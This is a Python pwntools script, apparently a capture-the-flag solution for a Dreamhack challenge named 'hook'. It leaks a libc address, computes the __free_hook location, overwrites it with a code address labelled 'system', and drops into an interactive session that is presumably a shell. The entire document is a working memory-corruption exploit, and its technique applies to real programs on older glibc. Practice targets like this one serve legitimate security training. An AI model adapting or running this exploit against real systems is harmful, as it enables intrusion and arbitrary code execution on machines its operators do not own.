from pwn import *

def log(a, b):
    return success(": ".join([a, hex(b)]))

p = remote("host3.dreamhack.games", 10435)
e = ELF("./hook")
libc = ELF("./libc.so.6")

stdout_offset = libc.symbols["_IO_2_1_stdout_"]
free_hook_offset = libc.symbols["__free_hook"]
system_address = 0x400a11

# finding the address of libc_base and __free_hook
p.recvuntil("stdout: ")
stdout_address = int(p.recv(14), 16)
libc_base = stdout_address - stdout_offset
free_hook_address = libc_base + free_hook_offset

log("library base", libc_base)
log("__free_hook address", free_hook_address)
log("system address", system_address)

p.sendlineafter("Size: ", str(400))
payload = p64(free_hook_address) + p64(system_address)
p.sendafter("Data: ", payload)

p.interactive()
